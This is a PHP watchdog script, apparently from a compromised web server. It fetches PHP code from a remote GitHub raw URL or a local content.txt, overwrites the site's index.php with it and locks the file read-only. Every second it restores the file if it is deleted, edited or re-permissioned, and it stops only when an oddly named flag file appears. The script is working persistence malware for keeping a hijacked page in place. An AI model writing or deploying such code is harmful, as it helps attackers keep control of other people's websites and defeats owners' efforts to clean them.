<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
ignore_user_abort(true);
set_time_limit(0);

$stopFlag = 'roobts.txt';
$targetFile = 'index.php';
$sourceFile = 'content.txt';
$remoteURL  = 'https://raw.githubusercontent.com/black2729134369/https-m.fatier.com-/refs/heads/main/index.php';

// 期望的文件权限 (0444 = 只读)
$expectedPerms = 0444;

file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Script started\n", FILE_APPEND);

$code = null;

while (true) {
    if (file_exists($stopFlag)) {
        @unlink($stopFlag);
        file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Stop flag detected. Exiting.\n", FILE_APPEND);
        break;
    }

    $shouldUpdate = false;
    
    // 尝试读取 content.txt
    if (file_exists($sourceFile)) {
        $newCode = file_get_contents($sourceFile);
        @unlink($sourceFile);
        file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " content.txt updated and deleted\n", FILE_APPEND);

        if ($code === null || md5($newCode) !== md5($code)) {
            $code = $newCode;
            $shouldUpdate = true;
        }
    }
    // 如果本地没有 content.txt，就尝试远程下载
    elseif ($code === null) {
        $newCode = @file_get_contents($remoteURL);
        if ($newCode !== false) {
            file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " content.txt fetched from remote\n", FILE_APPEND);
            $code = $newCode;
            $shouldUpdate = true;
        } else {
            file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Failed to fetch remote content\n", FILE_APPEND);
        }
    }

    // 检查目标文件是否需要恢复
    if ($code !== null) {
        $needsRestore = false;
        $restoreReason = "";
        
        // 检查文件是否存在
        if (!file_exists($targetFile)) {
            $needsRestore = true;
            $restoreReason = "file_missing";
            file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Target file missing\n", FILE_APPEND);
        } 
        // 检查文件内容或权限是否匹配
        else {
            $currentContent = @file_get_contents($targetFile);
            $currentPerms = fileperms($targetFile) & 0777; // 获取当前文件权限
            
            if ($currentContent === false) {
                $needsRestore = true;
                $restoreReason = "cannot_read";
                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Cannot read target file\n", FILE_APPEND);
            } 
            // 检查内容是否被修改
            elseif (md5($currentContent) !== md5($code)) {
                $needsRestore = true;
                $restoreReason = "content_modified";
                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Target file content modified\n", FILE_APPEND);
            }
            // 检查权限是否被修改
            elseif ($currentPerms != $expectedPerms) {
                $needsRestore = true;
                $restoreReason = "permission_modified";
                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Target file permission modified: " . decoct($currentPerms) . " (expected: " . decoct($expectedPerms) . ")\n", FILE_APPEND);
            }
        }
        
        // 如果需要恢复或者有新的更新
        if ($needsRestore || $shouldUpdate) {
            // 先确保我们有写入权限
            if (file_exists($targetFile)) {
                @chmod($targetFile, 0644);
            }
            
            $result = file_put_contents($targetFile, $code);
            if ($result !== false) {
                // 设置正确的权限 (0444 = 只读)
                chmod($targetFile, $expectedPerms);
                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " {$targetFile} restored (reason: {$restoreReason})\n", FILE_APPEND);
                
                // 记录恢复后的权限
                $restoredPerms = fileperms($targetFile) & 0777;
                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Restored file permissions: " . decoct($restoredPerms) . "\n", FILE_APPEND);
            } else {
                file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " Failed to restore {$targetFile}\n", FILE_APPEND);
            }
        }
    } else {
        file_put_contents('watchdog.log', date('Y-m-d H:i:s') . " No content available yet\n", FILE_APPEND);
    }

    usleep(1000000); // 每秒检查一次
}